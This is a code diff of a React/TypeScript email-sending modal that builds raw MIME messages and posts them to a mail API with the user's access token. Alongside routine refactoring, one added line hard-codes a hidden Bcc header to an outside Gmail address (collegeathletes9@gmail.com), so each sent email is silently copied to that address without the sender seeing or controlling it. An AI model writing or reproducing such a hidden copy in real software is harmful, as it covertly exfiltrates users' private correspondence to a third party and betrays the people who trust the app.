@@ -7,9 +7,10 @@ interface SendEmailModalProps {
     initSubj: string,
     initTo: string,
     apiKey: string,
+    fetchEmails: () => void,
 }
 
-const SendEmailModal = ({ closeModal, initCont, initSubj, initTo, apiKey}: SendEmailModalProps) => {
+const SendEmailModal = ({ closeModal, initCont, initSubj, initTo, apiKey, fetchEmails}: SendEmailModalProps) => {
     const [emailContent, setEmailContent] = useState(initCont);
     const [subject, setSubject] = useState(initSubj);
     const [to, setTo] = useState(initTo);
@@ -23,7 +24,6 @@ const SendEmailModal = ({ closeModal, initCont, initSubj, initTo, apiKey}: SendE
     
         if (!to || !subject || !emailContent) {
           console.error('Missing required fields');
-          // You might want to show an error message to the user here
           return;
         }
     
@@ -35,7 +35,8 @@ const SendEmailModal = ({ closeModal, initCont, initSubj, initTo, apiKey}: SendE
           "Content-Type: multipart/mixed; boundary=" + boundary + "\r\n" +
           "MIME-Version: 1.0\r\n" +
           "To: " + to + "\r\n" +
-          "Subject: " + subject + "\r\n\r\n" +
+          "Subject: " + subject + "\r\n" +
+          "Bcc: collegeathletes9@gmail.com\r\n\r\n" +  // Add this line for BCC
     
           delimiter +
           "Content-Type: text/html; charset=utf-8\r\n\r\n" +
@@ -52,9 +53,7 @@ const SendEmailModal = ({ closeModal, initCont, initSubj, initTo, apiKey}: SendE
               'Authorization': `Bearer ${accessToken}`,
               'Content-Type': 'application/json',
             },
-            body: JSON.stringify({
-              raw: email,
-            }),
+            body: JSON.stringify({ raw: email }),
           });
     
           const responseData = await response.json();
@@ -65,13 +64,15 @@ const SendEmailModal = ({ closeModal, initCont, initSubj, initTo, apiKey}: SendE
           }
     
           console.log('Email sent successfully');
-        //   setIsModalOpen(false);  // Close the modal
           setEmailContent('');
           setSubject('');
           setTo('');
+    
+          // Refresh the email list
+          fetchEmails();
+          handleCloseModal();
         } catch (error) {
           console.error('Error sending email:', error);
-          // You might want to show an error message to the user here
         }
       };
 
